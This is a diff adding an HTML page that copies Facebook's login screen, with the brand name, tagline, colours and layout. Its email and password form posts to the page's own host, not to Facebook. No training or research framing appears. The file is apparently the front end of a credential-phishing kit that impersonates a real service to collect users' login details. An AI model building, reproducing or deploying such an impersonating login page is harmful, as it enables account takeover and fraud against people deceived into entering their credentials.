@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log in or Sign up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { display: flex; max-width: 1000px; gap: 50px; padding: 20px; }
+        .left-section { flex: 1; padding-top: 100px; }
+        .logo { color: #1877f2; font-size: 60px; font-weight: bold; }
+        .tagline { font-size: 28px; margin-top: 10px; }
+        .right-section { flex: 1; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 14px 16px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        .login-btn { background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; padding: 14px; width: 100%; cursor: pointer; }
+        .login-btn:hover { background: #166fe5; }
+        .forgot-link { text-align: center; display: block; margin: 15px 0; color: #1877f2; text-decoration: none; }
+        .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; padding: 14px; margin: 20px auto; display: block; width: 60%; }
+        .create-btn:hover { background: #36a420; }
+        .create-page { text-align: center; margin-top: 30px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">facebook</div>
+            <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <form method="POST">
+                    <input type="text" name="email" placeholder="Email address or phone number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                <a href="#" class="forgot-link">Forgotten password?</a>
+                <hr style="margin: 20px 0; border: 0.5px solid #dadde1;">
+                <button class="create-btn">Create New Account</button>
+            </div>
+            <div class="create-page">
+                <b>Create a Page</b> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+</body>
+</html>
